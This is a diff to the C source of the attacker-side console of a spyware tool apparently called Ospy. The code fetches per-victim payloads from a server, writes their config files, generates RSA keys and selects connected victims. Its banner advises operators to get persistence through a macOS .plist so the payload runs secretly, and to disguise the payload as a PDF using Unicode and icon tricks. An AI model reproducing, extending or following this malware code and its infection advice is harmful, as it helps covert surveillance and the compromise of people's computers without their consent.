@@ -20,9 +20,9 @@ void create_new_payload(){
 	getcwd(pwd, sizeof(pwd)); // set in "pwd" the current path
 	
 	FILE * config_file;
+	char config_file_path[MAX_USER_NAME_LEN  + 25];
+	char RSA_pem_creator_commend[200];
 	char victim_name[MAX_USER_NAME_LEN];
-	char commend[MAX_USER_NAME_LEN  + 40];
-	char payload_folder_path[15 + MAX_USER_NAME_LEN];
 	bool exit_createto_loop = false;
 	do {
 		print_small_banner();
@@ -32,15 +32,13 @@ void create_new_payload(){
 		
 		safe_scan(&victim_name, MAX_USER_NAME_LEN);
 		if (valid_victim_name(victim_name)){
-			// request the payload from the server
-			A_2_S_encrypted_message_handler(data, GET_VICTIM_PAYLOAD);
+			A_2_S_encrypted_message_handler(data, GET_VICTIM_PAYLOAD);// request the payload from the server
 			if (recv_file(victim_name, "payload", "", "payload") == FILE_RECEIVED)
 				exit_createto_loop = true;
 			else{
 				printf("\n[\033[31;1m-\033[0m] \033[31;1mError receiving the payload\033[0m\n");
 				sleep(2);
 			}
-			
 		}
 		else {
 			printf("\n[\033[31;1m-\033[0m] \033[31;1mInvalid input, victim name may include 'a'-'z', 'A'-'Z', '_' only\033[0m\n");
@@ -48,20 +46,23 @@ void create_new_payload(){
 		} 		
 	} while (!exit_createto_loop);
 	
-	
-		
 	/*
 	create the config file
 	the config file will look like :
 		ori_mac_mini ( this is the victim_name)
 		16b1c83de8f9518e673838b2d6ea75dc ( this is the md5 hash of the name of the attacker)
 	*/
-	sprintf(commend, "Ospy/%s/payload/config", victim_name);
-	config_file = fopen(commend, "wt");
+	sprintf(config_file_path, "Ospy/%s/payload/config", victim_name);
+	config_file = fopen(config_file_path, "wt");
 	fprintf(config_file, "%s\n", victim_name); 
 	fprintf(config_file, "%s", md5(attacker_username)); 
-	fclose(config_file);	
+	fclose(config_file);
 	
+	// create RSA public and privet key
+	sprintf(RSA_pem_creator_commend, "openssl genrsa -out Ospy/%s/payload/private_key.pem 2048 &> /dev/null", victim_name);
+	system(RSA_pem_creator_commend);
+	sprintf(RSA_pem_creator_commend, "openssl rsa -in Ospy/%s/payload/private_key.pem -out Ospy/%s/payload/public_key.pem -outform PEM -pubout &> /dev/null", victim_name, victim_name);
+	system(RSA_pem_creator_commend);
 	print_small_banner();
 	printf("\033[31;1m███████▀▀▀░░░░░░░▀▀▀███████\033[0m  \033[32;1mYES ! the payload saved successfully.\033[0m\n\033[31;1m████▀░░░░░░░░░░░░░░░░░▀████\033[0m  You can find the payload in Ospy folder.\n\033[31;1m███│░░░░░░░░░░░░░░░░░░░│███\033[0m  [»] Ospy folder path : %s/Ospy\n\033[31;1m██▌│░░░░░░░░░░░░░░░░░░░│▐██\033[0m\n\033[31;1m██░└┐░░░░░░░░░░░░░░░░░┌┘░██\033[0m  \033[4;37m\033[1m\033[37mHere some hacker tips for great Ospy infect :\033[0m\n\033[31;1m██░░└┐░░░░░░░░░░░░░░░┌┘░░██\033[0m\n\033[31;1m██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██\033[0m  * \x1B[36mPlist\033[0m\n\033[31;1m██▌░│██████▌░░░▐██████│░▐██\033[0m    We will use .plist to tall the victim\n\033[31;1m███░│▐███▀▀░░▄░░▀▀███▌│░███\033[0m    computer to run the payload secretly\n\033[31;1m██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██\033[0m    as long as the computer runs\n\033[31;1m██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██\033[0m\n\033[31;1m████▄─┘██▌░░░░░░░▐██└─▄████\033[0m  * \x1B[36mFake PDF trojan\033[0m\n\033[31;1m█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████\033[0m    The malicious payload can be created and\n\033[31;1m████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████\033[0m    disguised to appear as a legitimate PDF using\n\033[31;1m█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████\033[0m    a few Unicode and icon manipulation tricks\n\033[31;1m███████▄░░░░░░░░░░░▄███████\033[0m\n\033[31;1m██████████▄▄▄▄▄▄▄██████████\033[0m  \033[4;37mFOR THE FULL GUIDE PRESS HERE\033[0m\n",pwd);
 }
@@ -141,12 +142,12 @@ void choose_victim (){
 	}
 	else {
 		#ifdef USER_MESSAGE_PROMPT
-//		connecting_load();
 		moving_airplane();
 		#endif
 		
 		strcpy(data.selected_victim_name, connected_victims[attacker_selection - '0']);
 		strcpy(selected_victim_name, connected_victims[attacker_selection - '0']); // for later use
 		A_2_S_encrypted_message_handler(data, SELECT_VICTIM);
+		
 	}	
 }
